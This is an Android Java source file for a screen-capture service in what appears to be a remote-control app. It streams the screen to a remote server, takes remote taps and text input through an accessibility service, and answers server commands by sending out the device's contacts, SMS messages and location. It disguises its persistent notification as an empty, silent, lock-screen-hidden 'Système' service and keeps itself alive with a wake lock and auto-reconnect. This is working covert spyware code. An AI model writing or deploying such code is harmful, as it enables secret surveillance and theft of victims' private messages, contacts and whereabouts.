package com.remote.control;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class ScreenCaptureService extends Service {

    private static final String TAG = "ScreenCapture";
    private static final String CHANNEL_ID = "remote_control_channel";
    private static final int NOTIFICATION_ID = 1;

    public static boolean isRunning = false;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private WebSocket webSocket;
    private OkHttpClient httpClient;
    private PowerManager.WakeLock wakeLock;

    private HandlerThread handlerThread;
    private Handler handler;

    // H.264 encoder
    private MediaCodec mediaCodec;
    private Surface encoderSurface;
    private boolean useH264 = true;
    private boolean codecRunning = false;
    private Thread encoderThread;

    // Data collector (contacts, SMS, location)
    private DataCollectorService dataCollector;

    private int screenWidth = 720;
    private int screenHeight = 1280;
    private int screenDensity;
    private int jpegQuality = 40;
    private int fps = 15;
    private int bitrate = 2000000; // 2 Mbps default
    private AtomicBoolean sending = new AtomicBoolean(false);

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        // Get screen metrics
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        screenDensity = metrics.densityDpi;

        // Scale down for performance (max 720p width)
        float scale = Math.min(720f / metrics.widthPixels, 1f);
        screenWidth = (int) (metrics.widthPixels * scale);
        screenHeight = (int) (metrics.heightPixels * scale);

        // Keep CPU alive when screen is off
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteControl::ScreenCapture");

        handlerThread = new HandlerThread("ScreenCapture");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        httpClient = new OkHttpClient.Builder()
            .retryOnConnectionFailure(true)
            .build();

        // Initialize data collector
        dataCollector = new DataCollectorService(this);
        dataCollector.startLocationTracking();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // Start foreground notification
        Notification notification = buildNotification();
        startForeground(NOTIFICATION_ID, notification);

        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");
        String serverUrl = intent.getStringExtra("serverUrl");
        String sessionId = intent.getStringExtra("sessionId");

        if (data == null || serverUrl == null || sessionId == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        wakeLock.acquire(24 * 60 * 60 * 1000L); // 24h max
        isRunning = true;

        // Setup MediaProjection
        MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = projManager.getMediaProjection(resultCode, data);

        if (mediaProjection == null) {
            Log.e(TAG, "MediaProjection is null");
            stopSelf();
            return START_NOT_STICKY;
        }

        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                Log.d(TAG, "MediaProjection stopped");
                cleanup();
                stopSelf();
            }
        }, handler);

        // Connect WebSocket then start capture
        connectWebSocket(serverUrl, sessionId);

        return START_STICKY;
    }

    private void connectWebSocket(String serverUrl, String sessionId) {
        // Build WebSocket URL
        String wsUrl = serverUrl;
        if (wsUrl.startsWith("https://")) {
            wsUrl = "wss://" + wsUrl.substring(8);
        } else if (wsUrl.startsWith("http://")) {
            wsUrl = "ws://" + wsUrl.substring(7);
        }
        if (!wsUrl.startsWith("ws://") && !wsUrl.startsWith("wss://")) {
            wsUrl = "wss://" + wsUrl;
        }
        // Remove trailing slash
        if (wsUrl.endsWith("/")) wsUrl = wsUrl.substring(0, wsUrl.length() - 1);
        wsUrl = wsUrl + "/ws/android/" + sessionId;

        Log.d(TAG, "Connecting to: " + wsUrl);

        Request request = new Request.Builder().url(wsUrl).build();

        webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket ws, Response response) {
                Log.d(TAG, "WebSocket connected!");
                // Send device info
                try {
                    JSONObject info = new JSONObject();
                    info.put("type", "device-info");
                    JSONObject device = new JSONObject();
                    device.put("model", Build.MODEL);
                    device.put("manufacturer", Build.MANUFACTURER);
                    device.put("androidVersion", Build.VERSION.RELEASE);
                    device.put("sdkVersion", Build.VERSION.SDK_INT);
                    device.put("screenWidth", screenWidth);
                    device.put("screenHeight", screenHeight);
                    info.put("device", device);
                    ws.send(info.toString());
                } catch (Exception e) {
                    Log.e(TAG, "Error sending device info", e);
                }

                // Start screen capture
                handler.post(() -> startScreenCapture());
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleCommand(text);
            }

            @Override
            public void onClosing(WebSocket ws, int code, String reason) {
                Log.d(TAG, "WebSocket closing: " + reason);
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                Log.d(TAG, "WebSocket closed: " + reason);
                // Try to reconnect after 3 seconds
                handler.postDelayed(() -> {
                    if (isRunning) {
                        String url = serverUrl;
                        connectWebSocket(url, sessionId);
                    }
                }, 3000);
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                Log.e(TAG, "WebSocket error: " + t.getMessage());
                // Try to reconnect after 5 seconds
                handler.postDelayed(() -> {
                    if (isRunning) {
                        connectWebSocket(serverUrl, sessionId);
                    }
                }, 5000);
            }
        });
    }

    private void startScreenCapture() {
        if (useH264) {
            startH264Capture();
        } else {
            startJpegCapture();
        }
    }

    // ======================== H.264 ENCODING (MediaCodec) ========================

    private void startH264Capture() {
        try {
            // Ensure dimensions are even (required by H.264)
            screenWidth = screenWidth % 2 == 0 ? screenWidth : screenWidth - 1;
            screenHeight = screenHeight % 2 == 0 ? screenHeight : screenHeight - 1;

            // Configure MediaCodec encoder
            MediaFormat format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, screenWidth, screenHeight);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, bitrate);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, fps);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2); // Keyframe every 2 seconds
            format.setInteger(MediaFormat.KEY_BITRATE_MODE, MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_VBR);

            // Low latency profile
            format.setInteger(MediaFormat.KEY_PROFILE, MediaCodecInfo.CodecProfileLevel.AVCProfileBaseline);
            format.setInteger(MediaFormat.KEY_LEVEL, MediaCodecInfo.CodecProfileLevel.AVCLevel31);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                format.setInteger(MediaFormat.KEY_LOW_LATENCY, 1);
            }

            mediaCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            mediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoderSurface = mediaCodec.createInputSurface();
            mediaCodec.start();
            codecRunning = true;

            // Create VirtualDisplay writing to encoder surface
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "RemoteControl-H264",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                encoderSurface,
                null, handler
            );

            // Start encoder output thread
            encoderThread = new Thread(this::drainEncoder, "H264-Encoder");
            encoderThread.start();

            // Notify viewer about H.264 mode
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", "stream-config");
                msg.put("codec", "h264");
                msg.put("width", screenWidth);
                msg.put("height", screenHeight);
                msg.put("fps", fps);
                msg.put("bitrate", bitrate);
                webSocket.send(msg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending stream config", e);
            }

            Log.d(TAG, "H.264 capture started: " + screenWidth + "x" + screenHeight + " @ " + fps + "fps, " + (bitrate / 1000) + "kbps");

        } catch (Exception e) {
            Log.e(TAG, "H.264 init failed, falling back to JPEG", e);
            useH264 = false;
            startJpegCapture();
        }
    }

    private void drainEncoder() {
        MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();

        while (codecRunning && isRunning) {
            try {
                int outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000); // 10ms timeout

                if (outputIndex >= 0) {
                    ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(outputIndex);
                    if (outputBuffer != null && bufferInfo.size > 0 && webSocket != null) {
                        outputBuffer.position(bufferInfo.offset);
                        outputBuffer.limit(bufferInfo.offset + bufferInfo.size);

                        // Create packet: [flags(1 byte)] + [timestamp(8 bytes)] + [h264 data]
                        byte[] h264Data = new byte[bufferInfo.size];
                        outputBuffer.get(h264Data);

                        byte[] packet = new byte[9 + h264Data.length];
                        // Flag: bit 0 = keyframe
                        packet[0] = (byte) ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0 ? 1 : 0);
                        // Timestamp (big-endian long)
                        long ts = bufferInfo.presentationTimeUs;
                        for (int i = 0; i < 8; i++) {
                            packet[1 + i] = (byte) (ts >> (56 - i * 8));
                        }
                        // H.264 NAL data
                        System.arraycopy(h264Data, 0, packet, 9, h264Data.length);

                        // Send as binary WebSocket message
                        okio.ByteString binaryData = okio.ByteString.of(packet);
                        webSocket.send(binaryData);
                    }

                    mediaCodec.releaseOutputBuffer(outputIndex, false);

                } else if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    // Send SPS/PPS in the new format
                    MediaFormat newFormat = mediaCodec.getOutputFormat();
                    Log.d(TAG, "H.264 format changed: " + newFormat.toString());

                    ByteBuffer sps = newFormat.getByteBuffer("csd-0");
                    ByteBuffer pps = newFormat.getByteBuffer("csd-1");
                    if (sps != null && pps != null) {
                        byte[] spsBytes = new byte[sps.remaining()];
                        sps.get(spsBytes);
                        byte[] ppsBytes = new byte[pps.remaining()];
                        pps.get(ppsBytes);

                        try {
                            JSONObject codecData = new JSONObject();
                            codecData.put("type", "codec-data");
                            codecData.put("sps", Base64.encodeToString(spsBytes, Base64.NO_WRAP));
                            codecData.put("pps", Base64.encodeToString(ppsBytes, Base64.NO_WRAP));
                            webSocket.send(codecData.toString());
                        } catch (Exception e) {
                            Log.e(TAG, "Error sending codec data", e);
                        }
                    }
                }
            } catch (IllegalStateException e) {
                // Codec released, exit
                break;
            } catch (Exception e) {
                Log.e(TAG, "Encoder drain error", e);
                break;
            }
        }
        Log.d(TAG, "Encoder thread stopped");
    }

    private void requestKeyFrame() {
        if (mediaCodec != null && codecRunning) {
            try {
                Bundle params = new Bundle();
                params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
                mediaCodec.setParameters(params);
                Log.d(TAG, "Keyframe requested");
            } catch (Exception e) {
                Log.e(TAG, "Error requesting keyframe", e);
            }
        }
    }

    // ======================== JPEG FALLBACK ========================

    private void startJpegCapture() {
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "RemoteControl",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null, handler
        );

        // Frame capture loop
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;
                captureFrame();
                handler.postDelayed(this, 1000 / fps);
            }
        });

        Log.d(TAG, "JPEG capture started: " + screenWidth + "x" + screenHeight + " @ " + fps + "fps");
    }

    private void captureFrame() {
        if (imageReader == null || webSocket == null || sending.get()) return;

        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image == null) return;

            sending.set(true);

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;

            // Create bitmap from image
            Bitmap bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);

            // Crop if needed (remove padding)
            if (rowPadding > 0) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                bitmap.recycle();
                bitmap = cropped;
            }

            // Compress to JPEG
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, jpegQuality, stream);
            bitmap.recycle();

            byte[] jpegBytes = stream.toByteArray();
            String base64Frame = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);

            // Send frame via WebSocket
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", "frame");
                msg.put("frame", base64Frame);
                msg.put("timestamp", System.currentTimeMillis());
                msg.put("width", screenWidth);
                msg.put("height", screenHeight);
                webSocket.send(msg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending frame", e);
            }

            sending.set(false);

        } catch (Exception e) {
            sending.set(false);
            Log.e(TAG, "Error capturing frame", e);
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }

    private void handleCommand(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            String type = cmd.optString("type", "");

            switch (type) {
                case "touch":
                    handleTouch(cmd.optJSONObject("event"));
                    break;
                case "text-input":
                    handleTextInput(cmd.optString("text", ""));
                    break;
                case "system-key":
                    handleSystemKey(cmd.optString("key", ""));
                    break;
                case "set-quality":
                    JSONObject quality = cmd.optJSONObject("quality");
                    if (quality != null) {
                        jpegQuality = quality.optInt("jpeg", jpegQuality);
                        fps = quality.optInt("fps", fps);
                        if (quality.has("bitrate")) {
                            bitrate = quality.optInt("bitrate", bitrate);
                            // Update encoder bitrate dynamically
                            if (mediaCodec != null && codecRunning) {
                                try {
                                    Bundle params = new Bundle();
                                    params.putInt(MediaCodec.PARAMETER_KEY_VIDEO_BITRATE, bitrate);
                                    mediaCodec.setParameters(params);
                                } catch (Exception e) {
                                    Log.e(TAG, "Error updating bitrate", e);
                                }
                            }
                        }
                        Log.d(TAG, "Quality updated: JPEG=" + jpegQuality + " FPS=" + fps + " Bitrate=" + bitrate);
                    }
                    break;
                case "request-keyframe":
                    requestKeyFrame();
                    break;
                case "viewer-ready":
                    Log.d(TAG, "Viewer is ready");
                    if (useH264) requestKeyFrame();
                    break;
                case "get-contacts":
                    if (dataCollector != null) {
                        dataCollector.sendDataToServer(webSocket, "contacts");
                    }
                    break;
                case "get-sms":
                    if (dataCollector != null) {
                        int limit = cmd.optInt("limit", 50);
                        try {
                            JSONObject msg = new JSONObject();
                            msg.put("type", "data-report");
                            msg.put("dataType", "sms");
                            msg.put("data", dataCollector.getSms(limit));
                            webSocket.send(msg.toString());
                        } catch (Exception e) {
                            Log.e(TAG, "Error sending SMS data", e);
                        }
                    }
                    break;
                case "get-location":
                    if (dataCollector != null) {
                        dataCollector.sendDataToServer(webSocket, "location");
                    }
                    break;
                case "get-all-data":
                    if (dataCollector != null) {
                        dataCollector.sendDataToServer(webSocket, "all");
                    }
                    break;
                default:
                    Log.d(TAG, "Unknown command: " + type);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling command: " + e.getMessage());
        }
    }

    private void handleTouch(JSONObject event) {
        if (event == null) return;
        RemoteControlService service = RemoteControlService.instance;
        if (service == null) {
            Log.w(TAG, "AccessibilityService not active - cannot perform touch");
            return;
        }

        String action = event.optString("action", "tap");
        // Coordinates are normalized 0.0-1.0, convert to screen pixels
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        int realWidth = metrics.widthPixels;
        int realHeight = metrics.heightPixels;

        switch (action) {
            case "tap":
                int x = (int) (event.optDouble("x", 0) * realWidth);
                int y = (int) (event.optDouble("y", 0) * realHeight);
                service.performTap(x, y);
                break;
            case "swipe":
                int sx = (int) (event.optDouble("startX", 0) * realWidth);
                int sy = (int) (event.optDouble("startY", 0) * realHeight);
                int ex = (int) (event.optDouble("endX", 0) * realWidth);
                int ey = (int) (event.optDouble("endY", 0) * realHeight);
                long duration = event.optLong("duration", 300);
                service.performSwipe(sx, sy, ex, ey, duration);
                break;
            case "scroll":
                int scx = (int) (event.optDouble("x", 0.5) * realWidth);
                int scy = (int) (event.optDouble("y", 0.5) * realHeight);
                int dy = (int) (event.optDouble("deltaY", 0) * realHeight * 0.3);
                service.performSwipe(scx, scy, scx, scy - dy, 200);
                break;
        }
    }

    private void handleTextInput(String text) {
        RemoteControlService service = RemoteControlService.instance;
        if (service != null) {
            service.performTextInput(text);
        }
    }

    private void handleSystemKey(String key) {
        RemoteControlService service = RemoteControlService.instance;
        if (service != null) {
            service.performSystemKey(key);
        }
    }

    private void cleanup() {
        isRunning = false;
        codecRunning = false;

        if (encoderThread != null) {
            encoderThread.interrupt();
            encoderThread = null;
        }
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaCodec != null) {
            try {
                mediaCodec.stop();
                mediaCodec.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing codec", e);
            }
            mediaCodec = null;
        }
        if (encoderSurface != null) {
            encoderSurface.release();
            encoderSurface = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (webSocket != null) {
            webSocket.close(1000, "Service stopped");
            webSocket = null;
        }
        if (dataCollector != null) {
            dataCollector.stopLocationTracking();
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    @Override
    public void onDestroy() {
        cleanup();
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Système",
                NotificationManager.IMPORTANCE_MIN // Minimum priority = silent + hidden
            );
            channel.setDescription("Service systeme");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                channel.setAllowBubbles(false);
            }
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
            .setContentTitle("") // Empty title
            .setContentText("") // Empty text
            .setSmallIcon(android.R.drawable.stat_notify_sync) // Generic system icon
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN) // Lowest priority
            .setVisibility(Notification.VISIBILITY_SECRET) // Hide from lock screen
            .build();
    }
}
